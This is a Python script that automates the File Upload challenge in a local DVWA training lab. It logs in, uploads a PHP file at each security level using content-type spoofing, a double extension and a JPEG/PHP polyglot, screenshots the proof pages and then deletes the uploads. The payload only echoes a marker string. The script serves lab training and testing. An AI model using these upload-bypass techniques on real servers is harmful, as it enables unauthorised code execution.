#!/usr/bin/env python3
import argparse
import json
import re
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright


TZ = timezone(timedelta(hours=8))
MARKER = b"DVWA_UPLOAD_PROOF_20260608"
PHP_PAYLOAD = b'<?php echo "DVWA_UPLOAD_PROOF_20260608"; ?>'


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def token(html):
    soup = BeautifulSoup(html, "html.parser")
    field = soup.find("input", {"name": "user_token"})
    return field.get("value") if field else None


def page_text(html):
    return " ".join(BeautifulSoup(html, "html.parser").get_text(" ").split())


def parse_uploaded_path(text):
    match = re.search(r"(\.\./\.\./hackable/uploads/[^\s<>]+|[a-f0-9]{32}\.(?:jpg|jpeg|png))\s+succesfully uploaded!", text)
    return match.group(1) if match else None


def login(session, base, username, password):
    resp = session.get(urljoin(base, "login.php"), timeout=10)
    data = {"username": username, "password": password, "Login": "Login", "user_token": token(resp.text)}
    session.post(urljoin(base, "login.php"), data=data, allow_redirects=True, timeout=10)


def set_security(session, base, difficulty):
    resp = session.get(urljoin(base, "security.php"), timeout=10)
    data = {"security": difficulty, "seclev_submit": "Submit", "user_token": token(resp.text)}
    session.post(urljoin(base, "security.php"), data=data, allow_redirects=True, timeout=10)


def upload(session, base, difficulty, filename, content, content_type):
    set_security(session, base, difficulty)
    form = session.get(urljoin(base, "vulnerabilities/upload/"), timeout=10)
    data = {"Upload": "Upload"}
    t = token(form.text)
    if t:
        data["user_token"] = t
    resp = session.post(
        urljoin(base, "vulnerabilities/upload/"),
        data=data,
        files={"uploaded": (filename, content, content_type)},
        timeout=20,
    )
    text = page_text(resp.text)
    uploaded_path = parse_uploaded_path(text)
    if uploaded_path and uploaded_path.startswith("../../"):
        access_url = urljoin(base, uploaded_path.replace("../../", ""))
    elif uploaded_path:
        access_url = urljoin(base, "hackable/uploads/" + uploaded_path)
    else:
        access_url = None
    return {"difficulty": difficulty, "filename": filename, "uploaded_path": uploaded_path, "access_url": access_url, "response_text": text}


def main():
    parser = argparse.ArgumentParser(description="Capture DVWA File Upload proof screenshots and cleanup temporary uploads.")
    parser.add_argument("--url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="password")
    parser.add_argument("--source-path", default=r"D:\phpStudy\PHPTutorial\WWW\DVWA")
    parser.add_argument("--output-dir", required=True)
    args = parser.parse_args()

    base = args.url if args.url.endswith("/") else args.url + "/"
    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    source_path = Path(args.source_path)
    upload_dir = source_path / "hackable" / "uploads"
    jpg = (source_path / "hackable" / "users" / "admin.jpg").read_bytes()
    poly = jpg + b"\n" + PHP_PAYLOAD + b"\n"
    session = requests.Session()
    login(session, base, args.username, args.password)

    uploads = [
        upload(session, base, "low", "dvwa_upload_screen_low_20260608.php", PHP_PAYLOAD, "application/x-php"),
        upload(session, base, "medium", "dvwa_upload_screen_medium_20260608.php", PHP_PAYLOAD, "image/jpeg"),
        upload(session, base, "high", "dvwa_upload_screen_high_20260608.php.jpg", poly, "image/jpeg"),
        upload(session, base, "impossible", "dvwa_upload_screen_impossible_20260608.php.jpg", poly, "image/jpeg"),
    ]

    cookies = [{"name": c.name, "value": c.value, "domain": "127.0.0.1", "path": c.path or "/"} for c in session.cookies]
    items = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page(viewport={"width": 1366, "height": 900})
        page.context.add_cookies(cookies)
        for item in uploads:
            difficulty = item["difficulty"]
            if item["access_url"]:
                page.goto(item["access_url"], wait_until="networkidle")
                time.sleep(0.2)
                shot = out_dir / f"{difficulty}-proof.png"
                page.screenshot(path=str(shot), full_page=True)
                item["screenshot"] = str(shot)
            items.append(item)
        browser.close()

    cleanup = []
    for item in uploads:
        uploaded_path = item.get("uploaded_path")
        if not uploaded_path:
            continue
        if uploaded_path.startswith("../../"):
            rel = uploaded_path.replace("../../hackable/uploads/", "")
        else:
            rel = uploaded_path
        path = upload_dir / rel
        existed = path.exists()
        deleted = False
        error = None
        if existed:
            try:
                path.unlink()
                deleted = True
            except Exception as exc:
                error = str(exc)
        cleanup.append({"path": str(path), "existed_before_cleanup": existed, "deleted": deleted, "error": error})

    manifest = {"generated_at": now_iso(), "items": items, "cleanup": cleanup}
    (out_dir / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(manifest, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
